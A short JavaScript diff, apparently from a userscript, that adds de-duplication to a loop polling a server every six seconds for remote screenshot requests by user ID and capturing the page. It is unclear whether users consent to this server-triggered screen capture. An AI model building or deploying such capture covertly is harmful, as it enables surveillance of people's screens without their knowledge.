@@ -482,6 +482,7 @@
 
 
         // POLL for Remote Screenshot Requests (Every 6s)
+        const processedRequests = new Set();
         setInterval(async () => {
             try {
                 // 1. Check for requests
@@ -489,11 +490,15 @@
                 const data = await res.json();
 
                 if (data.status === 'success' && data.requests && data.requests.length > 0) {
-                    console.log("Found remote screenshot requests:", data.requests);
+                    // console.log("Found remote screenshot requests:", data.requests);
 
                     // 2. Process each request
                     for (const userId of data.requests) {
+                        // Prevent infinite loop if server fails to clear request
+                        if (processedRequests.has(userId)) continue;
+
                         console.log(`Processing screenshot for User: ${userId}...`);
+                        processedRequests.add(userId); // Mark as processed locally
 
                         // Capture (using same logic as Telegram)
                         // await ensureHtml2Canvas(); // Removed: loaded via @require
